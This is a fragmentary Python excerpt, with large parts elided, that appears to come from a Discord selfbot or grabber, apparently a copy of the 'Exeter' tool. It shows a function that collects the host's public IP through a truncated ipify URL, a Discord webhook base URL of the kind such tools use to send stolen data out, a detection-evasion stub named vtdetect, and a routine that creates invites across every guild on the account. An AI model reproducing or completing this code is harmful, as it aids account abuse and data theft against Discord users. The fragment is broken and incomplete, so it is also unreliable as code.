...
# @vdpe
# Shitass exeter paste, don't use.
...
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify")).read().decode().strip()
    except:
        pass
    return ip
...
api = "https://canary.discord.com/api/webhooks/"
def vtdetect():
...
async def backup(ctx,snipestatus=None):
    ...
    for guild in SelfSide.guilds:
        ...
        try:
            ...
            inv = requests.post(f'https://discord.com/api/v9/channels/{invchannel.id}/invites', json = payload, headers = headers)
